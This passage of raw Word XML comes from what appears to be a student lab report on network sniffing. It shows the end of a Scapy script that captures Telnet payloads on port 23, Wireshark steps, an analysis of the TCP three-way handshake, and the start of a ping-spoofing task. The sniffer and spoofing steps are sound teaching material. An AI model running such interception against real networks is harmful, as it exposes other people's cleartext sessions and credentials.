        <w:t xml:space="preserve">(TCP) and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>packet.haslayer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C042BB0" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        payload = packet[Raw].load</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370CBC88" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b"telnet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">" in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>payload.lower</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>() or packet[TCP].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 23 or packet[TCP].sport == 23:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BCBB57" w14:textId="0D4DB6BA" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[+] Telnet Packet: {payload}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176BD30C" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print("[*] Starting Telnet sniffing...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A9AEEA" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sniff(filter="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> port 23", prn=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>packet_callback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>="br-88cd79cb4c2d", store=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137AD1E7" w14:textId="7967AECC" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A559F8A" wp14:editId="65531CCF">
            <wp:extent cx="5486400" cy="1484630"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="211450408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04088" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1484630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="682D18F0" w14:textId="0BA28475" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="00545DEF" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig7: Pasting the script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592D6572" w14:textId="77777777" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="00F655BE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C5C5D97" w14:textId="3B7DEE39" w:rsidR="00545DEF" w:rsidRPr="00C2328F" w:rsidRDefault="00F655BE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Then you want to run the script with </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python3 telnet_sniffer.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command. After that, trying to run basic command in the host a terminal and the packets should get sniff in the attacker terminal like the picture below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143BDE1B" w14:textId="0F700ED1" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="00F655BE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58F51AA7" wp14:editId="03B9E3C3">
            <wp:extent cx="5486400" cy="2750820"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20090918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91899" name="Picture 1" descr="A screenshot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2750820"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6054D305" w14:textId="0DF6782C" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="00F655BE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig8: Sniff packets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADC2151" w14:textId="77777777" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="00F655BE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1524FAC5" w14:textId="01E9AE11" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="007D490B" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Next press Ctrl + C in to stop the script then turn on Wireshark and choose the network interface: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>br-88cd79cb4c2d</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Then in Host A terminal type a simple command like </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">echo </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Wireshark</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> test</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Wireshark should capture the packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6A3BCA" w14:textId="1A0C922F" w:rsidR="007D490B" w:rsidRPr="00C2328F" w:rsidRDefault="007D490B" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F50C780" wp14:editId="7FC7ABD9">
            <wp:extent cx="5486400" cy="2950845"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1199406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0628" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2950845"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BF497B" w14:textId="1A02583D" w:rsidR="00F655BE" w:rsidRPr="00C2328F" w:rsidRDefault="007D490B" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig9: Wireshark output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F4E767" w14:textId="77777777" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Within the above captured telnet packets, identify and show the packets for TCP three-way handshake. Analyze the TCP three-way handshake protocols using the above sniffed packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B66E949" w14:textId="5BAB5B87" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00C74EFE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57E322D5" wp14:editId="713BF8D6">
            <wp:extent cx="6391159" cy="298938"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="156763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30765" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6968451" cy="325940"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="521993AA" w14:textId="0662BAEC" w:rsidR="00C74EFE" w:rsidRPr="00C2328F" w:rsidRDefault="00C74EFE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig10: Wireshark captured packets showing TCP three-way handshake</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3D5C69" w14:textId="1ED552EC" w:rsidR="00C74EFE" w:rsidRPr="00C2328F" w:rsidRDefault="00C74EFE" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>As u can see from Figure10, packet 31 shows that from 10.9.5 which is host A send to host B (10.9.0.6) a packet with TCP protocol and flag tag SYN to start the connection. Then host B send back a packet with flag SYN and ACK telling host A it knows receipt of the initial SYN. Packet 33 show that host A send the final packet with flag ACK to complete the three-way handshake. After that packets are send between these 2 host with the established TCP connection and after 1 side receive a packet</w:t>
      </w:r>
      <w:r w:rsidR="008B3620" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it will send back an ACK.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0262B267" w14:textId="2884AEBE" w:rsidR="008B3620" w:rsidRPr="00C2328F" w:rsidRDefault="008B3620" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05308160" wp14:editId="3F79E662">
            <wp:extent cx="5486400" cy="1303020"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="109677543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75435" name="Picture 1" descr="A screen shot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1303020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07564494" w14:textId="1391A099" w:rsidR="008B3620" w:rsidRPr="00C2328F" w:rsidRDefault="008B3620" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig11: Packets being sent after the three-way handshake.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795E2F4D" w14:textId="2AF3CFAE" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Suppose Host A is sending </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a ping</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> request to the above IP address IP_1 calculated with your student No. As the Attacker, you write a Python program using Scapy to sniff the series of ping packets from Host A to IP_</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1 and</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> then spoof all those packets to respond to Host A. Use Wireshark to demo you sniff successfully and explain your above spoofing </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
